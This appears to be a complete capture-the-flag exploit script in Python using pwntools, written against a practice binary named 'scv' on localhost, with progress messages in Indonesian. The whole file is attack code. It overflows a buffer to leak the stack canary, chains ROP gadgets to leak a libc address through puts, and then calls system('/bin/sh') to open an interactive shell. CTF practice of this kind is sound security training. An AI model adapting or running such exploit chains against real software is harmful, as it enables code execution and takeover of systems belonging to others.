#!/usr/bin/python
from pwn import *
import sys

host = '127.0.0.1'
port = 1337

def feed (payload):
	r.recvuntil ('>>')
	r.sendline ('1')
	r.recvuntil ('>>')
	r.send (payload)

def view ():
	r.recvuntil ('>>')
	r.sendline ('2')
	r.recvuntil ('[*]PLEASE TREAT HIM WELL.....\n-------------------------\n')
	buff = r.recvuntil ('\n-------------------------')
	new_line = buff.find ('\n')
	canary = buff [new_line:new_line+8].replace ('\n', '\x00', 1)
	return canary

def mine ():
	r.recvuntil ('>>')
	r.sendline ('3')
	r.recvline ()

def exploit (r):
	junk = 'A' * 168
	padding = 'B' * 8
	puts_got_plt = p64 (0x602018)
	puts = p64 (0x4008d0)
	rdi_ret = p64 (0x400ea3)
	main = p64 (0x400a96)

	feed (junk + '\n')
	canary = view ()

	print 'Canary adalah            : {}'.format (hex (u64 (canary)))

	payload = junk + canary + padding + rdi_ret + puts_got_plt + puts + main
	feed (payload)
	mine ()

	puts_leak = r.recvuntil ('\n', drop = True).ljust (8, '\x00')
	print 'Alamat puts adalah       : {}'.format (hex (u64 (puts_leak)))
	base_libc = u64 (puts_leak) - lib.symbols ['puts']
	print 'Alamat mulai libc adalah : {}'.format (hex (base_libc))

	system = p64 (base_libc + lib.symbols['system'])
	bin_sh = p64 (base_libc + 0x18cd17)

	print 'Alamat system adalah     : {}'.format (hex (u64 (system)))
	print 'Alamat /bin/sh adalah    : {}'.format (hex (u64 (bin_sh)))
	payload = junk + canary + padding + rdi_ret + bin_sh + system
	feed (payload + '\n')
	mine ()

	r.interactive ()
	r.close ()

if __name__ == '__main__':
	bin = ELF ('./scv')
	lib = ELF ('./libc-2.23.so', checksec = False)
	if len (sys.argv) > 1:
		r = remote (host, port)
		exploit (r)
	else:
		r = process ('./scv', env = {'LD_PRELOAD' : './libc-2.23.so'})
		exploit (r)
